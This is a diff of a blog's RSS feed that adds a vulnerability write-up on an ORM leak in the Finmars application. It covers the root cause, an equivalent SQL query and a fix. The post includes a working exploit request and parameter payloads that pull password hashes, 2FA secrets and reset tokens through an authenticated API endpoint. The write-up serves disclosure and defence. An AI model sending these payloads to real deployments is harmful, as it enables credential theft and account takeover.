@@ -4,12 +4,109 @@
         <link>https://g03m0n.github.io/categories/cves/</link>
         <description>CVEs - Category - g03m0n</description>
         <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 31 Mar 2026 08:31:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cves/" rel="self" type="application/rss+xml" /><item>
-    <title>ORM Leak Vulnerability</title>
+    <title>ORM Leak Vulnerability in Finmars</title>
     <link>https://g03m0n.github.io/posts/orm-leak-vulnerability-in-finmars/</link>
     <pubDate>Tue, 31 Mar 2026 08:31:01 &#43;0800</pubDate>
     <author>g03m0n</author>
     <guid>https://g03m0n.github.io/posts/orm-leak-vulnerability-in-finmars/</guid>
-    <description><![CDATA[<h1 id="orm-leak-vulnerability">ORM Leak Vulnerability</h1>
+    <description><![CDATA[<h1 id="orm-leak-vulnerability-in-finmars">ORM Leak Vulnerability in Finmars</h1>
+<p>I recently conducted research on <a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2025#:~:text=2%20%2D%20ORM%20Leaking%20More%20Than%20You%20Joined%20For" target="_blank" rel="noopener noreffer">ORM Leaking</a>
+ - Top 2 web hacking technique by PortSwigger. Following this study, I utilized <a href="https://sourcegraph.com/search?q=context:global&#43;lang:python&#43;/%5C.filter%5C%28%5C*%5C*%5Ba-zA-Z0-9_%5D%2B%5C%29%5C./&amp;patternType=keyword&amp;sm=0" target="_blank" rel="noopener noreffer">Sourcegraph</a>
+ to scan open-source repositories for potential vulnerabilities. This investigation led to the discovery of an ORM Leaking flaw within the <strong>Finmars</strong> repository.</p>
+<p></p>
+<p>Let&rsquo;s analyze the vulnerability.</p>
+<h2 id="description-and-impact">Description and Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version Affected</th>
+<th>Required Authentication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ORM Leaking</td>
+<td>finmars-core ≤ 1.24.5</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+<h2 id="root-cause-analysis"><strong>Root Cause Analysis</strong></h2>
+<h3 id="the-source"><strong>The Source</strong></h3>
+<p>The application contains a security vulnerability within the category data extraction feature (<code>/api/v1/specific-data/values-for-select/</code>). This endpoint is designed to return values to the user interface based on a specified model and column name (<code>key</code>).</p>
+<p><code>poms\api\urls.py</code></p>
+<p></p>
+<p>The vulnerability is the result of passing Untrusted Input directly from the API ViewSet down to the low-level ORM processing function.
+In the <code>ValuesForSelectViewSet</code> class, the application accepts the <code>content_type</code> and <code>key</code> parameters from the URL but does not apply any Whitelist:</p>
+<p><code>poms\common\views.py#L563</code></p>
+<p></p>
+<h3 id="the-sink"><strong>The Sink</strong></h3>
+<p>The <code>key</code> variable carrying the payload (e.g., <code>user__password</code>) is passed into the <code>_get_values_for_select</code> function. Here, it is directly embedded into Django ORM functions.</p>
+<p><code>poms\common\views.py#L434</code></p>
+<p></p>
+<p>When <code>.values_list('user__password', flat=True)</code> is called, the Django ORM automatically generates an <code>INNER JOIN</code> statement connecting the <code>users_member</code> table to the <code>auth_user</code> table and extracts the <code>password</code> column, completely bypassing the developer&rsquo;s original security intent.</p>
+<p><strong>Equivalent SQL Query:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">DISTINCT</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#34;users_member&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INNER</span> <span style="color:#66d9ef">JOIN</span> <span style="color:#e6db74">&#34;auth_user&#34;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ON</span> (<span style="color:#e6db74">&#34;users_member&#34;</span>.<span style="color:#e6db74">&#34;user_id&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;id&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;users_member&#34;</span>.<span style="color:#e6db74">&#34;master_user_id&#34;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">123</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">AND</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#66d9ef">IS</span> <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> <span style="color:#e6db74">&#34;auth_user&#34;</span>.<span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#66d9ef">ASC</span>;
+</span></span></code></pre></div><h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p><strong>Step 1:</strong> Log into the system as a regular user (Member) to obtain a valid Access Token.</p>
+<p><strong>Step 2:</strong> Send an HTTP GET request with a specially crafted payload:</p>
+<ul>
+<li><code>content_type</code>: Set to <code>users.member</code> (this table contains the <code>master_user</code> column, preventing a 500 Internal Server Error when passing through the authorization filter).</li>
+<li><code>key</code>: Set to <code>user__password</code> (utilizing ORM traversal to jump to the <code>auth_user</code> table).</li>
+</ul>
+<p>The final payload looks like this: <code>/realm00000/space00000/api/v1/specific-data/values-for-select/?content_type=users.member&amp;value_type=10&amp;key=user__password</code></p>
+<p>Request example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">realm00000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">space00000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">v1</span><span style="color:#f92672">/</span><span style="color:#a6e22e">specific</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span><span style="color:#f92672">/</span><span style="color:#a6e22e">values</span><span style="color:#f92672">-</span><span style="color:#66d9ef">for</span><span style="color:#f92672">-</span><span style="color:#a6e22e">select</span><span style="color:#f92672">/?</span><span style="color:#a6e22e">content_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">member</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">value_type</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">key</span><span style="color:#f92672">=</span><span style="color:#a6e22e">user__password</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">cookie</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Chromium&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;107&#34;</span>, <span style="color:#e6db74">&#34;Not=A?Brand&#34;</span>;<span style="color:#a6e22e">v</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;24&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mobile</span><span style="color:#f92672">:</span> <span style="color:#f92672">?</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">107.0</span>.<span style="color:#ae81ff">5304.107</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Ua</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Platform</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Linux&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">:</span> <span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Site</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">same</span><span style="color:#f92672">-</span><span style="color:#a6e22e">origin</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">cors</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Sec</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Fetch</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Dest</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">empty</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//127.0.0.1/realm00000/space00000/v/system/iam/member?page=1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gzip</span>, <span style="color:#a6e22e">deflate</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">en</span><span style="color:#f92672">-</span><span style="color:#a6e22e">US</span>,<span style="color:#a6e22e">en</span>;<span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">close</span>
+</span></span></code></pre></div><p></p>
+<p>The impact extends far beyond password hashes. Because the ORM allows arbitrary <code>JOIN</code> operations, an attacker can extract any sensitive data linked to the source table via foreign keys. For example, by altering the <code>key</code> parameter, an attacker can extract:</p>
+<ul>
+<li><strong>2FA/MFA Secrets: <code>key=user__otp_tokens__secret</code></strong></li>
+<li><strong>Password Reset Tokens: <code>key=user__password_reset_tokens__key</code></strong></li>
+<li><strong>PII &amp; Private Data:  <code>key=user__notifications__message</code></strong></li>
+</ul>
+<p>This allows for zero-interaction Account Takeover (ATO) and massive data breaches across the entire system.</p>
+<h2 id="recomendation">Recomendation</h2>
+<p>Strict input validation must be applied in <code>_get_values_for_select</code> to prevent users from leveraging Django ORM <strong>relation traversal</strong>.</p>
+<h2 id="references">References</h2>
+<p><a href="https://www.elttam.com/blog/plormbing-your-django-orm" target="_blank" rel="noopener noreffer">https://www.elttam.com/blog/plormbing-your-django-orm</a>
+</p>
 ]]></description>
 </item>
 <item>
